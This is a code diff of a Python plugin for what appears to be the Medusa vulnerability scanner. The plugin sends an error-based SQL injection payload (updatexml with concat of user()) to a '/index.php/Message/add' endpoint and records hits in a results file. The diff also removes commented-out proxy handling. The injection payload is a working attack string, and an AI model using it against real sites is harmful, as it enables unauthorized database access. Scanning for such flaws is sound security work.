@@ -40,8 +40,6 @@ def medusa(Url,RandomAgent,ProxyIp):
         port = 80
     else:
         port = port
-    global resp
-    global resp2
     try:
         payload="/index.php/Message/add"
         data = "contacts[content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 11231231313&mobile=2&content=3"
@@ -53,13 +51,6 @@ def medusa(Url,RandomAgent,ProxyIp):
         }
 
         s = requests.session()
-        # if ProxyIp!=None:
-        #     proxies = {
-        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-        #         "http": "http://" + str(ProxyIp)
-        #     }
-        #     resp = s.post(payload_url,headers=headers, timeout=6, data=data,proxies=proxies,verify=False)
-        # elif ProxyIp==None:
         resp = s.post(payload_url, headers=headers, timeout=6, data=data,  verify=False)
         con = resp.text
         code = resp.status_code
@@ -68,7 +59,7 @@ def medusa(Url,RandomAgent,ProxyIp):
             _t=VulnerabilityInfo(Medusa)
             web=ClassCongregation.VulnerabilityDetails(_t.info)
             web.Intermediate() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
-            return (str(Medusa))
+            ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception:
         _ = VulnerabilityInfo('').info.get('algroup')
         _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
